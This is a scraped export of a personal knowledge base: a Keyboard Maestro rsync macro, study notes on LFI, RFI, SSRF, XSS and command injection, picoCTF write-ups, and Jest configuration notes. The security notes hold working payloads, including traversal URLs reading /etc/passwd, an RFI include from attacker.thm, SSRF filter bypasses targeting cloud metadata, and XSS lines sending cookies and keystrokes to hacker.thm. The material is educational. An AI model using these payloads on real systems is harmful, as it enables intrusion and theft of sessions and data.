This, however, is a pretty complex world, so my toolkit and knowledge are limited atm.\n\n## Tools I use\n\n- [[automation/keyboard-maestro|Keyboard Maestro]]\n- Elgato Stream Deck\n- BetterTouchTool\n- Raycast\n- Shortcuts (iOS)\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/automation/favorite-km-macro":{"title":"My favorite KM macro","content":"\n~~I am a beginner music producer.~~ I occasionally play with sample-based boombap beats trying to make something audible. Because of this hobby, my drive is full of jazzy cuts. I wanted to have them synced on my [[MPC Live]] SSD so I can access them in the standalone mode (without the computer connected).\n\nThis was bothersome, because most of the time, whenever the inspiration hit or I had a minute to tinker with music, I needed to connect the MPC to the computer, manually copy the sample packs I've downloaded to the precise location on my MPC SSD, keeping in mind the naming scheme, directory structure, etc. instead of making music.\n\nFortunately, [[automation/keyboard-maestro|Keyboard Maestro]] has this feature to trigger a macro once the drive is attached, and the macro itself can be a command line. This way I can automate the process (to some extent) to sync the `~/Desktop/Beatmaker` directory to my MPC Live.\n\n\u003e [!tip] Note to self: Buy Hazel\n\u003e\n\u003e This could be automated even more with [Hazel](https://www.noodlesoft.com/) - I could automate the process of unarchiving and putting samples in `Beatmaker/` directory.\n\n## How to\n\nThanks to [[tools/terminal/rsync|rsync]], I can sync samples from my computer to the target device pretty easily without having to remove/copy the content that is already on my MPC.\n\n\u003e [!caution] One way syncing\n\u003e\n\u003e `rsync` is great for _one way_ synchronisation. It completely ignores what happens in the target directory, so the one I have on my computer is the _source of truth_ here.\n\nThe macro goes like that. Once the USB device that has `MPC` in name is attached, the following actions are triggered:\n\n1. Cancel all other macros\n   - for some reason, MPC mounts and dismounts few times once connected to Mac. Because of that the macro would run few times and I don't like that. I'm cancelling other macros to make sure `rsync` would run once\n   - This may be tricky to handle once I have more different macros running in the background, but for now it works perfectly\n2. Wait until the `/Volumes/MPC SSD` directory is mounted (_a folder exists_)\n3. Execute this command:\n   ```zsh\n   rsync -aP ~/Desktop/Beatmaker/ /Volumes/MPC\\ SSD/Beatmaker_sync\n   ```\n\nThe results should be shown in Keyboard Maestro's command output window (so I am sure everything went fine).\n\nThe final macro looks like that:\n![[assets/Screenshot 2022-10-22 at 14.57.49.png]]\n\n## Summary\n\nWith new every macro made, I see how much of what I did in front of my computer was mundane, senseless and completely repetible.

Privilege Escalation - the attempt to expand the access to a system. You can escalate horizontally and vertically:\n   - horizontally - accessing another account of the same permission group (i.e. another user),\n   - vertically - accessing another permission group (i.e. an `root`).\n5.

LFI exploits follow the same concepts as [[cybersecurity/knowledge/pentesting/path-traversal]].\n\n## Example\n\nSuppose the web application provides two languages, and the user can select between the EN and AR\n\n```php\n\u003c?php\n\tinclude($_GET[\"lang\"]);\n?\u003e\n```\n\nThe PHP code above uses a **GET request** via the URL parameter `lang` to **include** the file of the page.\n\n```\nhttp://webapp.com/index.php?lang=EN.php\nhttp://webapp.com/index.php?lang=AR.php\n```\n\nTheoretically, we can access and display any readable file on the server from the code above if there isn't any input validation:\n\n```\nhttp://webapp.com/index.php?lang=/etc/passwd\n```\n\n## Example #2\n\nThe developer might decided to specify the directory inside the function:\n\n```php\n\u003c?PHP\n\tinclude(\"languages/\". $_GET['lang']);\n?\u003e\n```\n\nIn the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.\n\nIf there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.\n\nThe `include` function allows us to include any called files into the current page. The following will be the exploit:\n\n```\nhttp://webapp.com/index.php?lang=../../../../etc/passwd\n```\n\n## Example #3\n\nIn the first two cases, we _checked_ the code for the web app, and then we knew how to exploit it. In case of [[black-box-testing]], we need to take a look of the error messages in order to understand how the data is passed and processed into the web app, eg:\n\n```\nWarning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/**THM-4**/index.php on line 12\n```\n\nThe error message discloses what the include function looks like:  `include(languages/THM.php);`\n\nWe can tell the function that includes files in the languages directory is adding `.php` at the end of the entry. Thus the valid input will be something like `index.php?lang=EN`, where the file EN is located inside the given `languages/` and named  `EN.php`.\n\nFrom the error message we also know the full web application directory which is `/var/www/html/THM-4/`\n\nTo exploit this, we need to use the [[cybersecurity/knowledge/pentesting/path-traversal|dot-dot-slash trick]] to get out the current folder:\n\n```\nhttp://webapp.com/index.php?lang=../../../../etc/passwd\n```\n\nWe already knew the `/var/www/html/THM-4` path has four levels, but we still receive the error:\n\n```\nWarning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n```\n\nThe error tells us that the developer specifies the file type to pass to the `include` function (namely it has to end with `.php`). To go around that, we need to use [[cybersecurity/knowledge/pentesting/null-byte]] injection:\n\n```\nhttp://webapp.com/index.php?file=../../../../etc/passwd%00\n```\n\n## Example #4 - filtered keywords\n\nLet's say the developer decided to filter keywords to avoid disclosing sensitive information and the `/etc/passwd` file has been filtered.\n\nThere are two possible methods to bypass the filter.\n\n- by using the [[cybersecurity/knowledge/pentesting/null-byte|null byte %00]]\n- the current directory [[cybersecurity/knowledge/pentesting/path-traversal]] trick at the end of the filtered keyword (`/.`)\n\nThe exploit will be similar to ```\n\n```\nhttp://webapp.thm/index.php?lang=/etc/passwd/.\n```\n\nIf we try `/etc/passwd/..`, it results to be  `/etc/` and that's because we moved one to the root. If we try `/etc/passwd/.`, the result will be `/etc/passwd` since dot refers to the current directory.\n\n## Example #5 - input validation\n\n---\n\nLet's say the developer starts to use input validation by filtering some keywords out of it.\n\n```\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n```\n\nBy using such URL, we got the following error:\n\n```php\nWarning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15\n```\n\nFrom the error message we know that the web application replaces the `../` with the empty string (it defaults the fn call to `include(languages/etc/passwd`).\n\nThere are a couple of techniques we can use to bypass this.\n\nWe can send the following [[cybersecurity/knowledge/glossary/payload]] to bypass it: `....//....//....//....//....//etc/passwd`, as the PHP filter only matches and replaces **the first subset** string it finds (`../`) and doesn't do another pass, turning\n\n```\n..//....//....//....//etc/passwd\n```\n\ninto\n\n```\n../../../../etc/passwd\n```\n\n## Example 6 - forced directory\n\nIf the developer forces the `include` fn to read from a defined directory, namely, if the web application asks to supply input that has to include a directory such as\n\n```\nhttp://webapp.thm/index.php?lang=languages/EN.php\n```\n\nthen, to exploit this, we need to include the directory in the [[cybersecurity/knowledge/glossary/payload]] like so:\n\n```\n?lang=languages/../../../../../etc/passwd\n```\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/RFI":{"title":"Remote File Inclusion","content":"\n_Remote File Inclusion_ is a technique to include remote files and into a vulnerable application. Like [[cybersecurity/knowledge/pentesting/LFI|Local File Inclusion]], the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function.\n\nOne requirement for RFI is that the `allow_url_fopen` option needs to be on.\n\nThe risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain [[Remote Command Execution (RCE)]] on the server. Other consequences of a successful RFI attack include:\n\n- Sensitive Information Disclosure\n- Cross-site Scripting ([[XSS]])\n- Denial of Service ([[DoS]])\n\nAn external server hosting malicious files must communicate with the application server for a successful RFI attack. The malicious file is injected into the `include` fn via HTTP requests, and the content of the malicious file executes on the vulnerable application server.\n\n## Example\n\nLet's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt` where cmd.txt contains PHP code:\n\n```php\n\u003c?php echo \"Hello World\"; ?\u003e\n```\n\nFirst, the attacker injects the malicious URL, which points to the attacker's server, such as\n\n```\nhttp://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt\n```\n\nIf there is no input validation, then the malicious URL passes into `include`. Next, the web app server will send a `GET` request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/ROE":{"title":"Rules of Engagement","content":"_Rules of Engagement_ is a document that is created at the initial stages of a pentesting engagement.

All we need is that **little bit of feedback** to successful enumerate a whole database. \n\n### Authentication Bypass\n`/* [...] */`\n\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/SSRF":{"title":"Server-side Request Forgery","content":"_Server-side Request Forgery_ is a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.\n\n## Types of SSRF\n\nThere are two types of SSRF vulnerability:\n- a regular SSRF - data is returned to the attacker's screen\n- _blind SSRF_ - an SSRF occurs, but no information is returned to the attacker's screen\n\n## Impact\nA successful SSRF attack can result in any of the following: \n\n- Access to unauthorised areas\n- Access to customer/organisational data\n- Ability to Scale to internal networks\n- Reveal authentication tokens/credentials\n\n## Examples\n\n### URL manipulation\n\nThe client expects similar request:\n```http\nhttp://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123\n```\n\nBy modifying the `url` query param, we might want to access different API endpoints, e.g.: \n\n```http\n# hacker requests\nhttp://website.thm/stock?url=http://api.website.thm/api/user\n\n# client request the server\nhttp://api.website.thm/api/user\n\n# server returns the user data instead of stock information\n```\n\n### With [[cybersecurity/knowledge/pentesting/path-traversal]]\n\nThe client expects similar request:\n```http\nhttp://website.thm/stock?url=/item?id=123\n```\n\nEven if we have control over the path, not the whole URL, by modifying the `url` param, we might want to access different API endpoints, e.g.: \n\n```http\n# hacker requests\nhttp://website.thm/stock?url=/../user\n\n# client request the server\nhttp://api.website.thm/api/stock/../user\n\n# server returns the user data instead of stock information\n```\n\n### Controlling the server's subdomain\nThe client expects similar request:\n```http\nhttp://website.thm/stock?server=api\u0026id=123\n```\n\n```http\n# hacker requests\nhttp://website.thm/stock?server=api.website.thm/api/user\u0026x=\u0026id=123\n                                [-------------------------]\n\n# client request the server\nhttp://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123\n     [----------------------------]                              [-]\n\n# server returns the user data instead of stock information\n```\n\nWe can control the server's subdomain to which the request is made (from `server` to `api.website.thm/api/user`). \n\nThe [[cybersecurity/knowledge/glossary/payload]] ending with `\u0026x=` is used to stop the remaining path from being appended to the end of the URL and turns into parameter itself.\n\n### Forcing webapp to request another server\n\nThe attacker can force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by `website.thm` (that would normally authenticate to `api.website.thm`).\n\nThe client expects similar request:\n```http\nhttp://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123\n```\n\n```http\n# hacker requests\nhttp://website.thm/stock?url=http://attacker.com/\n\n# webapp requests data from `attacker.com` revealing the API key\n```\n\n## Finding a SSRF\nSSRF vulnerabilities can be spotted in many different ways. Common examples: \n- A full URL used as a parameter in the address bar\n\t- `https://website.thm/form?server=http://server.website.thm/store`\n- A partial URL such as just the hostname\n\t- `https://website.thm/form?server=api`\n- Path of the URL\n\t- `https://website.thm/form?dst=/forms/contact`\n- In a hidden field in a form\n\nSome of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working [[cybersecurity/knowledge/glossary/payload]].\n\nIf working with a blind SSRF the output is not reflected back to us, so we'll need an external HTTP logging tool to monitor requests:\n- [RequestBin](requestbin.com)\n- your own HTTP server\n- [[Burp Suite]]'s Collaborator client.\n\n## Bypassing SSRF defenses\n\nSecurity-savvy developers aware of the SSRF may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, as follows:\n\n### *Deny List*\n\nAll requests are accepted apart from resources specified in a list or matching a particular pattern. \n\nA Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. \n\nA specific endpoint to restrict access is the `localhost`/`127.0.0.1`, which may contain server performance data or further sensitive information.\n\nAttackers can bypass a Deny List by using alternative localhost references such as `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001` or subdomains that have a DNS record which resolves to `127.0.0.1` such as `127.0.0.1.nip.io`.\n\nAlso, in a cloud environment, it would be beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address `169.254.169.254`.\n\n### *Allow List*\n\nAn allow list is where all requests get denied unless they appear on a list or match a particular pattern, eg. a rule that an URL used in a parameter must begin with `https://website.thm`. \n\nAn attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as `https://website.thm.attackers-domain.thm`. The application logic would now allow this input and let an attacker control the internal HTTP request.\n\n### Open Redirect\n\nAn open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address, e.g `https://website.thm/link?url=https://tryhackme.com`. This endpoint was created for statistics purposes. \n\nBut imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with `https://website.thm/`. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/XSS":{"title":"Cross-site Scripting","content":"\n_Cross-Site Scripting_, is an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.\n\nCross-site scripting vulnerabilities are extremely common:\n\n- [XSS found in Shopify](https://hackerone.com/reports/415484)\n- [$7,500 for XSS found in Steam chat](https://hackerone.com/reports/409850)\n- [$2,500 for XSS in HackerOne](https://hackerone.com/reports/449351)\n- [XSS found in Infogram](https://hackerone.com/reports/283825)\n\n## XSS payloads\n\nThe XSS [[payload]] is the JavaScript code we wish to be executed on the targets computer.\n\nThere are two parts to the payload:\n\n- _The intention_ - it's is what you wish the JavaScript to actually do\n- _The modification_ - it's the changes to the code we need to make it execute as every scenario is different\n\n## Examples of XSS intentions\n\n- Proof of Concept - the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website\n  - `\u003cscript\u003ealert('XSS');\u003c/script\u003e`\n- Stealing user session from Cookies\n  - `\u003cscript\u003efetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));\u003c/script\u003e`\n- Key logging\n  - `\u003cscript\u003edocument.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}\u003c/script\u003e`\n- Targeted at the business logic\n  - a lot more specific than the examples above\n  - calling a particular network resource or a JS fn, e.g. `user.changeEmail()`\n  - `\u003cscript\u003euser.changeEmail('attacker@hacker.thm');\u003c/script\u003e`\n\n## Types of XSS\n\n- [[cybersecurity/knowledge/pentesting/reflected-xss]]\n- [[cybersecurity/knowledge/pentesting/stored-xss]]\n- [[cybersecurity/knowledge/pentesting/dom-based-xss]]\n- [[cybersecurity/knowledge/pentesting/blind-xss]]\n\n## Escaping HTML\n\nViewing the page source, you can see your name reflected inside the value attribute of the input tag:\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)\n\nLet's say, we have a form that takes a name and renders it inside the `input` tag:\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n  \u003ch2\u003eHello, \u003cinput value=\"Adam\" /\u003e\u003c/h2\u003e\n\u003c/div\u003e\n```\n\nThe JavaScript payload can't run it from inside the `input` tag. We need to escape the `input` tag first so the payload can run properly. We can do this with the following payload:\n\n```\n\"\u003e\u003cscript\u003ealert('THM');\u003c/script\u003e\n```\n\nThe important part of the payload is the `\"\u003e` which closes the value parameter and then closes the input tag.\n\nThis now closes the input tag properly and allows the JavaScript payload to run:\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n  \u003ch2\u003e\n    Hello, \u003cinput value=\"\" /\u003e\n    \u003cscript\u003e\n      alert(\"THM\")\n    \u003c/script\u003e\n    \"\u003e\n  \u003c/h2\u003e\n\u003c/div\u003e\n```\n\nIn case of `textarea`, escaping looks a bit different. We're closing the `textarea` tag first:\n\n```html\n\u003c!-- payload --\u003e\n\u003c/textarea\u003e\u003cscript\u003ealert(\"THM\");\u003c/script\u003e\n```\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n\t\u003ch2\u003eHello, \u003ctextarea\u003e\u003c/textarea\u003e\u003cscript\u003ealert(\"THM\");\u003c/script\u003e\u003c/textarea\u003e\u003c/h2\u003e\n\u003c/div\u003e\n```\n\nTo get around the filters, we can also take advantage of the additional attributes of the tags, such as the `onload` event of an `img` tag. `onload` executes the code of your choosing once the image specified in the `src` attribute has loaded onto the web page:\n\n```\n/images/cat.jpg\" onload=\"alert('THM');` \n```\n","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/black-hats":{"title":"Black hats","content":"A commonly used term for malicious hackers.\n\nOut of respect for _good hackers_, it is advised to use these terms rather than the generic term _hacker_: \n- Threat actor\n- Cyber criminal\n- Black hat hackers, or _black hats_ for short","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/blind-xss":{"title":"Blind XSS","content":"## Blind XSS \nBlind XSS is similar to a [[cybersecurity/knowledge/pentesting/stored-xss]] in that your [[cybersecurity/knowledge/glossary/payload]] gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.\n\n## Example Scenario\n\nA website has a contact form where you can message a member of staff.

The webserver will process this code and execute it under the privileges and access controls of the user who is running that application (the app is running **on a** webserver **by** user).\n\nCommand injection is also often known as _Remote Code Execution_ because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the system, read files, data, etc.\n\n## Severity of Command Injection\n\n- One of the top ten vulnerabilities reported by [Contrast Security AppSec., 2019](https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report)i ntelligence report\n- the OWASP framework constantly proposes vulnerabilities of this nature as one of the [top ten](https://owasp.org/www-project-top-ten/) vulnerabilities of a web application\n\n## Detecting Command Injection\n\nProgramming languages often allow to make system calls on the OS, eg. taking input from file and searching for an entry into a file:\n\n```php\n\u003c?php\n$songs = \"/var/www/html/songs\"\n\nif (isset $_GET[\"title\"])) {\n\t$title = $_GET[\"title\"];\n\n\t$command = \"grep $title /var/www/html/songtitle.txt\"`;` -\n\tif ($search == \"\") {\n\t\t\t$return \"\u003cp\u003eThe requested song\u003c/p\u003e\u003cp\u003e $title does \u003c/p\u003e\u003cb\u003enot\u003c/b\u003e\u003cp\u003e exist!\u003c/p\u003e\";\n\t} else {\n\t\t$return \"\u003cp\u003eThe requested song\u003c/p\u003e\u003cp\u003e $title does \u003c/p\u003e\u003cb\u003eexist!\u003c/b\u003e\";\n\t}\n\n\techo $return;\n?\u003e\n```\n\n\u003e [!tip] It's just an example\n\u003e\n\u003e The content of `songtitle.txt` would typically be kept in the DB.\n\nApplications that use user input to populate system commands with data can often be combined in unintended behaviour, eg. with the shell operators `;`, `\u0026` and `\u0026\u0026` we can combine system commands and execute all of them.\n\nCommand Injection can be detected in mostly one of two ways:\n\n1.  Blind command injection\n    - no direct output from the application when testing [[cybersecurity/knowledge/glossary/payload]]s\n    - we need to investigate the app behaviour to determine if the payload was successful\n2.  Verbose command injection\n    - we have a direct feedback from the app once we tested a payload, e.g. with testing for `whoami` cmd\n\n### Detecting Blind Command Injection\n\nBlind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable.\n\nFor this type of command injection, we may need to use payloads that will cause some time delay. For example, the `ping` and `sleep` commands are significant payloads to test with. Using `ping` as an example, the application will hang for *x* seconds in relation to how many *pings* you have specified.\n\nAnother method of detecting blind command injection is by **forcing some output**. This can be done by using redirection operators such as `\u003e`, e.g., we can tell the web application to execute commands such as `whoami` and redirect that to a file. We can then use a command such as `cat` to read this newly created file’s contents.\n\nThe `curl` command is a great way to test for Command Injection, because we are able to use it to deliver data to and from an application in the payload:\n\n```sh\n$ curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`\n```\n\n### Detecting Verbose Command Injection\n\nVerbose command injection is when the application gives you feedback or output as to what is happening or being executed, e.g., the output of commands such as `ping` or `whoami` is directly displayed on the web application.\n\n## Useful payloads\n\n### Linux\n\n- `whoami`\n- `ls` - we may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.\n- `ping` - it will invoke the application to hang\n- `sleep` - it will invoke the application to hang, useful if the machine does not have `ping` installed.\n- `nc` - [[cybersecurity/knowledge/tools/netcat]] can be used to spawn a [[reverse shell]] onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges\n\n### Windows\n\n- `whoami`\n- `dir`\n- `ping`\n- `timeout` - similarly to Linux' `sleep` it's useful if the attacked machine does not have `ping` installed\n\n## Preventing Command Injection\n- Don't use vulnerable fns, like PHPs `exec`, `passthru`, `system`\n- Filter and sanitise inputs by specifying formats or types of data that users can submit\n\t- removing special characters from the input content (`\u003e`, `\u0026`, `/`)\n\t- using `\u003cinput pattern=\"[0-9+]\"\" /\u003e`\n\t- using PHPs [`filter_input`](https://www.php.net/manual/en/function.filter-input.php)\n\n## Bypassing filters\nWe can abuse the logic behind an application to bypass filters, eg. an application may strip out quotation marks, but we can instead use the hexadecimal value of this to achieve the same result:\n\n```php\n$payload = \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n```","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/knowledge/pentesting/dom-based-xss":{"title":"DOM-based XSS","content":"\n\n[[development/web/glossary/DOM]] Based [[cybersecurity/knowledge/pentesting/XSS]] is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.\n\nExecution occurs when the website JavaScript code acts on input or user interaction.\n\n## Example scenario\n\nThe website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section.

The problem is how to get more funds by exploiting the server. \n\nFortunately, the author left the [source code](https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c) for reference. I am not that proficient in C, I've been using it a few years ago at the university, but I tried to hack this one nonetheless.\n\nThe only place where I am able to anything is when I get into `Buy flags -\u003e Definitely not the flag Flag`. _Buying_ this one won't get me the flag needed to pass the exercise, it'll just adjust the _funds_ (or: `account_balance`) accordingly.\n\n### Source code analysis\nThere are some suspicious looking lines of code in the source:\n```c\nint total_cost = 0;\ntotal_cost = 900 * number_flags;\n```\n\nBoth `total_cost` and `number_flags` are Integers, which means their the maximum value is `2147483647` (adding `1` will result in a signed int of `-2147483648`). \n\nThe `number_flags` is the only variable I can change. \n\nAlso:\n```c\naccount_balance = account_balance - total_cost;\n```\n\nThe `account_balance` is an Integer as well. It's decreased by the `total_cost`. That'd mean if I'd be able to make `total_cost` negative, the `account_balance` **would increase** (base maths, *negative* + *negative* =\u003e *positive*). \n\n### Making `total_cost` negative\nSo how can we make `total_cost` negative? \n\nLet's get back to the integer overflowing idea. I've opened an online C compiler and tried to mess with the values: \n\n```c\n#include \u003cstdio.h\u003e\n\nint main()\n{\n    int x = 2147483647 + 1; // overflowed to -2147483648\n    int y = 900 * x; \n    printf(\"number_flags: %d\\ntotal_cost: %d\", x, y);\n\n    return 0;\n}\n\n// Output: \n// number_flags: -2147483648 \n// total_cost: 0\n```\n\nThat's no good. `900 * -2147483648` resulted in this: \n```sh\nwarning: overflow in conversion from ‘long int’ to ‘int’ changes value from ‘-1932735283200’ to ‘0’ [-Woverflow]\n```\n\nLet's try another: \n```c\nint x = 2147483647 + 10; // overflowed to -2147483639\nint y = 900 * x; \n\n// Output: \n// number_flags: -2147483639 \n// total_cost: 8100\n```\n\nYay, we've increased the `total_cost`! But it's not enough to finish the task, as we need to make it negative. \n\n\u003e The thing is that we'd need to find such a value for incrementing the maximum integer value of `2147483647` to make the `900 * result` overflowing and becoming negative as well.\n\nI've been appending zeros to the `x` increment to the point when the `total_cost` would become negative. I've settled with that: \n```c\n#include \u003cstdio.h\u003e\n\nint main () \n{\n  int x = 2147483647 + 100000000;\n  int y = 900 * -2047483649;\n  printf (\"number_flags: %d \\ntotal_cost: %d\", x, y);\n\n  return 0;\n}\n\n// Output: \n// number_flags: -2047483649 \n// total_cost: -194314116\n```\n\n### Grabbing the flag\nUltimately I've opened the server once again, tried to _buy_ `100000000` flag knockoffs and my `account_balance` increased to `194314316`, which was enough to buy the final flag. Problem solved 💪\n\n## Disclaimer\nAs I said, at the time of writing this I am not that proficient in C, and the numeric systems are still a bit of the open waters to me. Probably I could find the easier way of increasing the `account_balance`. But thanks to that meddling I was able to find the flag and that's most important to me 😉\n\n## Flag\n`picoCTF{m0n3y_bag5_65d67a74}`","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/write-ups/picoCTF/mus1c":{"title":"mus1c","content":"[Link to the exercise](https://play.picoctf.org/practice/challenge/15)\n\n## Steps \nAfter downloading and opening the `lyrics.txt` I saw somewhat cryptic lyrics of the _song_: \n```Rockstar\nPico's a CTFFFFFFF\nmy mind is waitin\nIt's waitin\n\nPut my mind of Pico into This\nmy flag is not found\nput This into my flag\nput my flag into Pico\n\n\nshout Pico\nshout Pico\nshout Pico\n\nMy song's something\nput Pico into This\n\nKnock This down, down, down\nput This into CTF\n\nshout CTF\nmy lyric is nothing\nPut This without my song into my lyric\nKnock my lyric down, down, down\n\nshout my lyric\n\nPut my lyric into This\nPut my song with This into my lyric\nKnock my lyric down\n\nshout my lyric\n\nBuild my lyric up, up ,up\n\nshout my lyric\nshout Pico\nshout It\n\nPico CTF is fun\nsecurity is important\nFun is fun\nPut security with fun into Pico CTF\nBuild Fun up\nshout fun times Pico CTF\nput fun times Pico CTF into my song\n\nbuild it up\n\nshout it\nshout it\n\nbuild it up, up\nshout it\nshout Pico\n```\n\nAfter a long while, I decided to check the hint, which suggested *mastering rockstar*.

This is what it looked like: \n\n```\n�`E��BC�;���Ϣi�\n```\n\nI wrote a simple function that'd iterate over the array of possible passwords and print the hashes for them: \n\n```python\npos_pw_list = [\"8799\", \"d3ab\", \"1ea2\", \"acaf\", \"2295\", \"a9de\", \"6f3d\"]\n\nfor p in pos_pw_list:\n\tprint(hash_pw(p))\n```\n\nThe third hash looked exactly the same as the one in `level3.hash.bin`: \n\n```\n�\u0005\u001b;�qlģ�/9�\u0019�s\n+\u0026�A��)HBf\u0006\u000f�\u0002C\n�`E��BC�;���Ϣi� // \u003c-- this one\n=�9d�\u0004=�����1�\u001f-\n\u0016\u0002m`��TA\u000b45�\u0003��\u0026\n��秦����=��F��L\n��\u001dV�Jx��\u0005CR���j\n```\n\n...so I just tried the third password from the array and it worked 😁\n\n\u003e Note: this time I've had to put it in the prompt without quotes\n\n## Flag\n`picoCTF{m45h_fl1ng1ng_6f98a49f}`","lastmodified":"2023-01-05T15:20:00.731940733Z","tags":null},"/cybersecurity/write-ups/picoCTF/pw-crack-4":{"title":"PW Crack 4","content":"[Link to the exercise](https://play.picoctf.org/practice/challenge/248)\n\nThis one is basically the same as [[cybersecurity/write-ups/picoCTF/pw-crack-3]], the only difference is the possible passwords count. \n\n## Steps\n_PW Crack 3_ was proposing a valid password among 6 non-valid ones. This exercise gives 100 options to validate instead. \n\nI could go over each of them, but it wouldn't be feasible. Instead, I modified the function I created before to print out the hashes to print only the password that's hash is the same as `correct_pw_hash`.\n\n```python\nfor p in pos_pw_list:\n\tif (hash_pw(p) == correct_pw_hash):\n\t\tprint(p)\n```\n\nI seriously wonder why I didn't take the same route when doing _PW Crack 3_.

I am not a PHP developer, but from the [docs](https://www.php.net/manual/en/reserved.variables.request.php) I got to know that `$_REQUEST` had contents of both `$_GET` and `$_POST` (and `$_COOKIE`, but that's doesn't matter here). \n\n### Exploitation\nI've ran Burp Suite to intercept the `GET` request sent from the website form and edited it to be `POST` one with `welcome2` as a string.

However this is not recommended, as it's a kind of _lying to yourself_ about how much of the code have been covered.\n\nIt's possible to set the `coverageThreshold` that will enforce how much of coverage is necessary for the code to pass the tests:\n\n```js\nmodule.exports = {\n  coverageThreshold: {\n    global: {\n      statements: 100,\n      branches: 100,\n      functions: 100,\n      lines: 100,\n    },\n  },\n};\n```\n\nIt's nice to set a bit below what the coverage is as of now, to make sure there won't be much of new code without tests committed.\n\n\u003e [!danger] The coverage is not a perfect metric for confidence.\n\u003e\n\u003e Not all lines in the codebase are _equal_ (some are more important than others).\n\nIt's possible to use a glob when setting the `coverageThreshold`.\n\n```js\nmodule.exports = {\n  coverageThreshold: {\n    \"./src/shared/utils.js\": {\n      statements: 100,\n      branches: 100,\n      functions: 100,\n      lines: 100,\n    },\n  },\n};\n```\n\n**Note:** When we add the specific files to the configuration, the `global` coverage threshold **lowers**.\n\nThe coverage can be added to CI/CD setup using [codecov](https://codecov.io).\n","lastmodified":"2023-01-05T15:20:00.735940772Z","tags":null},"/development/testing-javascript/configuring-jest/configuring-jest-for-testing-js-applications":{"title":"Configuring Jest for testing JS applications","content":"\n\u003e This note goes through useful Jests features, without actually going to how to write tests.\n\n## `process.env.NODE_ENV`\n\nFor testing `process.env.NODE_ENV === 'test'`. This can be used to enable `commonjs` modules in `babel` just for testing.\n\nJest picks up `.babelrc.js` automatically.\n\n## Configuring Jest's test environment for testing `node` or browser code\n\nJest uses JS DOM module to simulate browser in `node`. Technically the `window` property is simulated in `node` environment.\n\nWe can customize Jest to _enforce_ Browser/`node` environment with:\n\n```sh\njest -- --env=\"node\" // this will exclude JS DOM from the environment\n```\n\nIncluding JS DOM in the test runner without actually having a code that relies on the browser APIs may negatively affect the runners performance.\n\nThis can also be handled in `jest.config.js`:\n\n```js\nmodule.exports = {\n  testEnvironment: \"jest-environment-node\",\n  // testEnvironment: 'jest-environment-jsdom' // \u003c-- this works as well\n};\n```\n\nThese `testEnviroment`s are actually `node_modules`.\n\n## Support CSS imports with `moduleNameMapper`\n\nImporting styles is handled with `webpack` and `style-loader`, however this only works for the application itself. By default Jest will complain about importing 